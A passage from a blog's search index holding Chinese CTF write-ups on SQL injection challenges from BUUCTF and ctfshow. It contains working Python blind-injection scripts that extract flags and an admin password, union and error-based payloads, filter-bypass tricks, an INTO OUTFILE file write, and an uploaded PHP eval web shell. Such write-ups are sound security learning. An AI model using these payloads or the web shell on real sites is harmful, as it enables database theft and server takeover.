title="11.异或盲注-[WUSTCTF2020]颜值成绩查询"></a>11.异或盲注-[WUSTCTF2020]颜值成绩查询</h1><p><img src="/2021/07/19/BUU-sql/10-1.png"></p><p>尝试字符过滤测试…都没回显</p><p>尝试^异或</p><div class="hljs code-wrapper"><pre><code>正常输入 1 </code></pre></div><p><img src="/2021/07/19/BUU-sql/10-2.png"></p><div class="hljs code-wrapper"><pre><code>1^0</code></pre></div><p><img src="/2021/07/19/BUU-sql/10-2.png"></p><div class="hljs code-wrapper"><pre><code>1^1</code></pre></div><p><img src="/2021/07/19/BUU-sql/10-3.png"></p><p>所以可以套用上面的脚本，将参数进行稍加修改，跑出flag</p><div class="hljs code-wrapper"><pre><code>import requestsimport timeurl = &#39;xxx/?stunum=&#39;## 爆数据库名     ###  ctfpayload1 = &quot;1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&quot;## 爆表名     ###  flag,scorepayload2 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),&#123;&#125;,1))=&#123;&#125;)&quot;## 爆列名     ###  flag  flag,value  ###  scorepayload3 =&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),&#123;&#125;,1))=&#123;&#125;)&quot;## 爆字段     ### flag---fake flag         ### value---real flagpayload4 = &quot;1^(ascii(substr((select(group_concat(`value`))from`flag`),&#123;&#125;,1))=&#123;&#125;)&quot;catcat = &#39;&#39;flag = &#39;&#39;for i in range(0, 200):    print(&#39;第&#39;+str(i)+&#39;位&#39;)    for j in range(127):        time.sleep(0.05)        catcat = url+payload4.format(i, j)        exp = requests.get(url=catcat)        # print(exp.text)        if &quot;exists&quot; in exp.text:            flag = flag + chr(j)            print(&#39;--------------------------------------------&#123;&#125;&#39;.format(j))            print(&#39;*****************&#39;+flag)            breakprint(&quot;flag is &quot; + flag)</code></pre></div><p>有经验了…以后就不去读flag-flag了…  :)</p><h1 id="12-奇怪盲注-php短标签-CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#12-奇怪盲注-php短标签-CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="12.奇怪盲注+php短标签-[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>12.奇怪盲注+php短标签-[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>Point：</p><p>1.备份文件泄露             </p><p>2.sql盲注</p><p>3.php短标签</p><p><img src="/2021/07/19/BUU-sql/11-1.png"></p><p>登录界面..</p><p>审计源码，抓到一个image.php</p><p>尝试注入，完全无回显</p><p>dirsreach扫一下–&gt;robots.txt</p><p><img src="/2021/07/19/BUU-sql/11-2.png"></p><p>就那么几个php文件…都试一下–image.php.bak</p><p>拖下源码</p><div class="hljs code-wrapper"><pre><code>&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);                                                    $path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);                  $path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);</code></pre></div><p>先看下函数addslashes</p><p><img src="/2021/07/19/BUU-sql/11-3.png"></p><p>逻辑：</p><p>在预定义字符前+\<br>ban掉<strong>\\0,%00,\,‘</strong><br>再进行sql查询</p><p>sql语句：</p><div class="hljs code-wrapper"><pre><code>select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;在这被ban了...感觉可以直接用if函数对变量id进行bool注入...</code></pre></div><p><img src="/2021/07/19/BUU-sql/11-4.png"></p><p><img src="/2021/07/19/BUU-sql/11-5.png"></p><div class="hljs code-wrapper"><pre><code>Q:本地都打通了...也不知道为啥这题不行.(dalaodalao)利用前面的逻辑，变量id=\\0，这样在经过函数addslashes后，变成\\\0，再经过replace后，变成\，--&gt;id=&#39;\&#39;or path=&#39;，然后对变量path进行利用select * from images where id=&#39;\&#39; or path=&#39;    &#123;$path&#125;&#39;dalao的注入方法：select * from images where id=&#39;\&#39; or path=&#39; or id=(if(sql,1,0))#&#39;用path再查id的值，sql T回图片，F回空my way：select * from images where id=&#39;\&#39; or path=&#39; or (if(sql,1,0))#&#39;--&gt;select * from image where (if(sql,1,0))T--&gt;全部的值，F--&gt;空</code></pre></div><p><img src="/2021/07/19/BUU-sql/11-6.png">  </p><p>（这恒河里）</p><p>盲注直接给脚本：</p><div class="hljs code-wrapper"><pre><code>import requestsimport timeurl = &#39;http://d1040be0-cefd-4558-8c9a-dc7619ef8d73.node4.buuoj.cn:81/image.php?id=\\0&amp;path=&#39;# 爆数据库名     ### ciscnfinalpayload1 = &quot;or if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,1,0)%23&quot;# 爆表名        ### images,userspayload2 = &quot;or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,1,0)%23&quot;# 爆列名        ### users          #这里用user无回显...转十六进制payload3 = &quot;or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1))=&#123;&#125;,1,0)%23&quot;# 爆字段        ### username,password   ##admin///4f23ff2aa800ca8d84e1payload4 = &quot;or if(ascii(substr((select group_concat(password) from users),&#123;&#125;,1))=&#123;&#125;,1,0)%23&quot;catcat = &#39;&#39;flag = &#39;&#39;try:    for i in range(0, 100):        print(&#39;第&#39;+str(i)+&#39;位&#39;)        for j in range(32, 127):            time.sleep(0.05)            catcat = url+payload4.format(i, j)            exp = len(requests.get(url=catcat).content)            # print(exp.text)            if exp &gt; 10000:                flag = flag + chr(j)                print(&#39;--------------------------------------------&#123;&#125;&#39;.format(j))                print(&#39;*****************&#39;+flag)                breakexcept:    time.sleep(0.1)print(&quot;flag is &quot; + flag)</code></pre></div><p>盲注出admin+密码</p><p>登录，是个文件上传的样子</p><p><img src="/2021/07/19/BUU-sql/11-7.png"> </p><p>审计代码，前端挺干净的，尝试下后端的过滤</p><p>先用个一句话文档试试水，</p><p><img src="/2021/07/19/BUU-sql/11-8.png"> </p><p>访问该php文件</p><p><img src="/2021/07/19/BUU-sql/11-9.png"> </p><p>输出了文件名，尝试将一句话直接改成文件名上传，抓包，改名</p><p><img src="/2021/07/19/BUU-sql/11-10.png"></p><p>php被ban</p><p>短标签绕过</p><?php @eval($_POST['a']);?><p>—&gt;&lt;?=@eval($_POST[‘a’]);&gt;</p><p><img src="/2021/07/19/BUU-sql/11-13.png"></p><p><img src="/2021/07/19/BUU-sql/11-12.png"></p><p>无回显也就是一句话已经包含在了php文件内</p><p>success</p><p>连蚁剑，根目录，cat flag</p><p><img src="/2021/07/19/BUU-sql/11-15.png"></p><p>（验证想法）</p><h1 id="13-二次注入-报错注入-RCTF2015-EasySQL"><a href="#13-二次注入-报错注入-RCTF2015-EasySQL" class="headerlink" title="13.二次注入+报错注入-[RCTF2015]EasySQL"></a>13.二次注入+报错注入-[RCTF2015]EasySQL</h1><p>Point： </p><p>1.二次注入+报错注入<br>2.正则匹配regexp()<br>3.逆向输出reverse()<br>4.python切片反序输出</p><p>注册、登录、用户界面翻阅文章、修改密码</p><p>注册界面用户名存在字符过滤</p><p><img src="/2021/07/19/BUU-sql/13-1.png"></p><p>寻找回显位置，在修改密码时发现数据库报错</p><p><img src="/2021/07/19/BUU-sql/13-2.png"></p><p>猜测后端语句：</p><div class="hljs code-wrapper"><pre><code>select * from xxx where username=&quot;&quot; and pwd =&#39;d41d8cd98f00b204e9800998ecf8427e&#39;;</code></pre></div><p>尝试构造payload</p><p>用报错注入updatexml()</p><div class="hljs code-wrapper"><pre><code>//获取表名//article,flag,users1&quot;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code></pre></div><p>查找flag-flag-flag后，发现是个fake，查找users表</p><div class="hljs code-wrapper"><pre><code>//列名//users-real_flag_1s_her1&quot;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</code></pre></div><p>real_flag_1s_her列名报错，不存在该列<br>怀疑未完整输出<br>尝试正则匹配获取完整列名</p><div class="hljs code-wrapper"><pre><code>//users-real_flag_1s_here1&quot;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))#    </code></pre></div><p>尝试获取其中字段</p><div class="hljs code-wrapper"><pre><code>//users-real_flag_1s_here-xxxxxx1&quot;or(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</code></pre></div><p>多行数据，未能完整显示，正则匹配数字0-9</p><div class="hljs code-wrapper"><pre><code>//flag&#123;524699ed-cc79-402a-9f4a-241&quot;or(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;[0-9]&#39;)),0x7e),1))#</code></pre></div><p>获取了前半部分的flag，因为ban了left、right、mid等常见的位置函数，故使用逆向输出函数reverse()  </p><p>这里采用了双括号reverse(())将select以及regexp视为一体</p><div class="hljs code-wrapper"><pre><code>//~&#125;c27cb6e9cd42-a4f9-a204-97cc-de1&quot;or(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;[0-9]&#39;))),0x7e),1))#</code></pre></div><p>使用python数组反向输出，获取后半端flag</p><div class="hljs code-wrapper"><pre><code>str = &#39;~&#125;c27cb6e9cd42-a4f9-a204-97cc-de&#39;str = str[::-1]print(str)</code></pre></div><h2 id="正则函数regexp"><a href="#正则函数regexp" class="headerlink" title="正则函数regexp()"></a>正则函数regexp()</h2><p>检索符合条件的字符</p><div class="hljs code-wrapper"><pre><code>select()from()where()&amp;&amp;()regexp()select()from()where(()regexp())</code></pre></div><p><img src="/2021/07/19/BUU-sql/13-4.png"></p><h2 id="逆向输出reverse"><a href="#逆向输出reverse" class="headerlink" title="逆向输出reverse()"></a>逆向输出reverse()</h2><p>REVERSE - 返回字符串其字符顺序颠倒。 </p><p><img src="/2021/07/19/BUU-sql/13-5.png"></p><h2 id="python-切片操作反序输出"><a href="#python-切片操作反序输出" class="headerlink" title="python 切片操作反序输出"></a>python 切片操作反序输出</h2><div class="hljs code-wrapper"><pre><code>s=&#39;xxx&#39;s=s[::-1]print s</code></pre></div><h1 id="14-盲注-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#14-盲注-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="14.盲注-[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>14.盲注-[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p><img src="/2021/07/19/BUU-sql/14-1.png"></p><p>测被ban字符</p><p><img src="/2021/07/19/BUU-sql/14-3.png"></p><p>尝试注入方式</p><div class="hljs code-wrapper"><pre><code>id=(1)=(1)id=(1)=(2)回显不同//---&gt;if()</code></pre></div><p>构造payload:</p><div class="hljs code-wrapper"><pre><code>//直接查flag-flag的内容if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)</code></pre></div><p>改造盲注脚本—&gt;</p><div class="hljs code-wrapper"><pre><code>import requestsimport timeurl = &#39;http://5856489a-b75c-485a-b261-7d305316dd16.node4.buuoj.cn:81/index.php&#39;payload = &quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;flag = &#39;&#39;for i in range(0, 50):    print(&quot;第&#123;&#125;位&quot;.format(i))    for j in range(32, 127):        cn = &#123;            &#39;id&#39;: payload.format(i, j)        &#125;        # print(cn)        exp = requests.post(url=url, data=cn)        # print(exp)        if &quot;glzjin&quot; in exp.text:            flag = flag + chr(j)            print(&#39;--------------------------------------------&#123;&#125;&#39;.format(j))            print(&#39;*****************&#39; + flag)            break        time.sleep(0.1)</code></pre></div><h1 id="15-网鼎杯-2018-Fakebook"><a href="#15-网鼎杯-2018-Fakebook" class="headerlink" title="15.***-[网鼎杯 2018]Fakebook"></a>15.***-[网鼎杯 2018]Fakebook</h1>]]></content>
    
    
    
    <tags>
      
      <tag>web buu sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-sql</title>
    <link href="/2021/07/18/ctfshow-sql/"/>
    <url>/2021/07/18/ctfshow-sql/</url>
    
    <content type="html"><![CDATA[<p>ctfshow-sql题记</p><span id="more"></span><h1 id="web171-web175-无过滤注入"><a href="#web171-web175-无过滤注入" class="headerlink" title="web171-web175 无过滤注入"></a>web171-web175 无过滤注入</h1><h2 id="web171-‘-23’-‘–-’"><a href="#web171-‘-23’-‘–-’" class="headerlink" title="web171  ‘%23’ + ‘–+’"></a>web171  ‘%23’ + ‘–+’</h2><p><img src="/2021/07/18/ctfshow-sql/1.png">  </p><p>SQL注释符 : url(%23) === # === –+</p><p>payload:  </p><div class="hljs code-wrapper"><pre><code>1′ or 1=1%23</code></pre></div><h2 id="web172-to-base64-hex"><a href="#web172-to-base64-hex" class="headerlink" title="web172  to_base64()/hex()"></a>web172  to_base64()/hex()</h2><p><img src="/2021/07/18/ctfshow-sql/2.png">    </p><p>对结果进行了过滤，查询出的数据中不能包含flag，给出了数据库ctfshow_user2<br>flag头为ctfshow{xxx}，不包含’flag’ ……</p><p>可用to_base64()/hex()直接在输出时进行编码，绕过输出时特殊字符的过滤</p><p>payload:  </p><div class="hljs code-wrapper"><pre><code>1&#39;union select 1,2 %23//确定注入点1&#39;union select 1,password from ctfshow_user2 %23  //get flag  1&#39;union select 1,to_base64(password) from ctfshow_user2 where username=&#39;flag&#39; %23//利用to_base64()进行特殊字符的绕过</code></pre></div><h2 id="web173-json数据"><a href="#web173-json数据" class="headerlink" title="web173  json数据"></a>web173  json数据</h2><p><img src="/2021/07/18/ctfshow-sql/3.png"><br>json数据类型  </p><p><img src="/2021/07/18/ctfshow-sql/5.png">   </p><p>函数json_encode()和json_decode()  </p><p><img src="/2021/07/18/ctfshow-sql/6.png"><br>payload:  </p><div class="hljs code-wrapper"><pre><code>1&#39;union select 1,2,3%23//确定注入点  1&#39;union select 1,2,password from ctfshow_user3%23//get flag </code></pre></div><h2 id="web174-hex-replace"><a href="#web174-hex-replace" class="headerlink" title="web174  hex()/replace()"></a>web174  hex()/replace()</h2><p>避坑：第一次点击进入的是web173的网页……我是傻逼</p><p>数据库：ctfshow_user4   </p><p><img src="/2021/07/18/ctfshow-sql/9.png">  </p><p>返回数据，ban了flag和0-9</p><p>用的是替换的思路，将数字转换为其他字符，但分不清该字符是原字符还是替换后字符，<br>为避免该问题，用hex()函数将flag转为16进制，然后将0-9替换为q-z输出，<br>hex()返回值仅包含0-9和大写A-F，可解决上述问题。</p><p>payload:  </p><div class="hljs code-wrapper"><pre><code>1&#39;union select &#39;a&#39;,&#39;b&#39;%23//确定注入点1&#39; union select &#39;a&#39;,(select replace(replace (replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;r&#39;),&#39;3&#39;,&#39;s&#39;),&#39;4&#39;,&#39;t&#39;),&#39;5&#39;,&#39;u&#39;),&#39;6&#39;,&#39;v&#39;),&#39;7&#39;,&#39;w&#39;),&#39;8&#39;,&#39;x&#39;),&#39;9&#39;,&#39;y&#39;),&#39;0&#39;,&#39;z&#39;) from ctfshow_user4 where username=&#39;flag&#39;)–+//sql语句 get flag </code></pre></div><p>人工处理/脚本处理字符串，get flag</p><p>附python代码截图</p><p><img src="/2021/07/18/ctfshow-sql/10.png">   </p><h2 id="web175-into-outfile写入文件"><a href="#web175-into-outfile写入文件" class="headerlink" title="web175  into outfile写入文件"></a>web175  into outfile写入文件</h2><p>数据库：ctfshow_user5<br><img src="/2021/07/18/ctfshow-sql/11.png">   </p><p>返回数据，ban了所有字符……正常数据都不回显……</p><p>select  into  outfield  功能：<br>导出数据到pc的指定目录下。</p><p>payload:  </p><div class="hljs code-wrapper"><pre><code>1′ union select 1,2%23//确定注入点1′ union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/res.txt&#39;%23//访问res.txt get flag</code></pre></div><hr><h1 id="web176-web182-过滤注入"><a href="#web176-web182-过滤注入" class="headerlink" title="web176-web182  过滤注入"></a>web176-web182  过滤注入</h1><p><img src="/2021/07/18/ctfshow-sql/12.png"> </p><p><img src="/2021/07/18/ctfshow-sql/13.png"> </p><h2 id="web176-大小写"><a href="#web176-大小写" class="headerlink" title="web176  大小写"></a>web176  大小写</h2><div class="hljs code-wrapper"><pre><code>&#39;union select 1,2,3 from ctfshow_user%23//判断注入点&#39;union Select 1,2,3 from ctfshow_user%23//确定注入点&#39;union Select 1,2,password from ctfshow_user%23//get flag</code></pre></div><h2 id="web177"><a href="#web177" class="headerlink" title="web177  /**/"></a>web177  /**/</h2><p>ban空格==&gt;可使用/**/</p><p>数据库名，表名，列名可用”包含</p><div class="hljs code-wrapper"><pre><code>1&#39;union/**/select/**/1,2,password/**/from`ctfshow_user`%23//get flag</code></pre></div><h2 id="web178-09-20"><a href="#web178-09-20" class="headerlink" title="web178  %09 %20"></a>web178  %09 %20</h2><p>ban空格，/**/==&gt;%09<br>%20无用</p><p>ASCII(09)===Tab(水平制表符)<br>ASCII(20)===Space(空格)</p><div class="hljs code-wrapper"><pre><code>&#39;union%09select%091,2,password%09from`ctfshow_user`%23//get flag</code></pre></div><h2 id="web179-0c-0C"><a href="#web179-0c-0C" class="headerlink" title="web179  %0c/%0C"></a>web179  %0c/%0C</h2><p>空格==&gt;%0c/%0C</p><p>ASCII(0C)===换页键</p><div class="hljs code-wrapper"><pre><code>&#39;union%0cselect%0c1,2,password%0cfrom`ctfshow_user`%23//get flag</code></pre></div><h2 id="web-180-‘1’-’1"><a href="#web-180-‘1’-’1" class="headerlink" title="web 180 ‘1’=’1"></a>web 180 ‘1’=’1</h2><p>ban %23==&gt;’1’=’1</p><p>group_concat()拼接字符串</p><div class="hljs code-wrapper"><pre><code>&#39;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#39;1&#39;=&#39;1//get flagid=-1&#39;or(id=26)and&#39;1&#39;=&#39;1//Y4tacker师傅的姿势</code></pre></div><h2 id="web181-逻辑-and-gt-or"><a href="#web181-逻辑-and-gt-or" class="headerlink" title="web181  逻辑 and&gt;or"></a>web181  逻辑 and&gt;or</h2><p><img src="/2021/07/18/ctfshow-sql/14.png"> </p><p>除了括号，其他可以代替空格的都给过滤了， 而且select还不区分大小写了</p><div class="hljs code-wrapper"><pre><code>可用180中Y4tacker师傅的姿势：&#39;or(id=26)and&#39;1&#39;=&#39;1放进入sql语句 –&gt;&quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &quot;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1; &quot;;因为and的优先级大于or，语句相当于(username !=&#39;flag&#39; and id =&quot;) or (id=26 and &#39;1&#39;=&#39;1&#39;)左边为假，右边是真，所以sql语句相当于select id,username,password from ctfshow_user where id=26 and &#39;1&#39;=&#39;1&#39; limit 1 ;    利用逻辑关系闭合payload</code></pre></div><p>学废了学废了  </p><p>借鉴上述原理，构建近似payload：  </p><div class="hljs code-wrapper"><pre><code>&#39;or(`username`=&#39;flag&#39;)and&#39;1&#39;=&#39;1&#39;or(`password`like&#39;c%&#39;)and&#39;1&#39;=&#39;1 //flag以c开头</code></pre></div><h2 id="web182-模糊搜索-like"><a href="#web182-模糊搜索-like" class="headerlink" title="web182  模糊搜索 like"></a>web182  模糊搜索 like</h2><p><img src="/2021/07/18/ctfshow-sql/15.png"> </p><p>在181的基础上+ban了flag  </p><div class="hljs code-wrapper"><pre><code>&#39;or(`username`like&#39;f%&#39;)and&#39;1&#39;=&#39;1 //模糊搜索&#39;or(`password`like&#39;c%&#39;)and&#39;1&#39;=&#39;1 //flag以c开头</code></pre></div><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>………………………………</p>]]></content>
    
    
    
    <tags>
      
      <tag>web ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
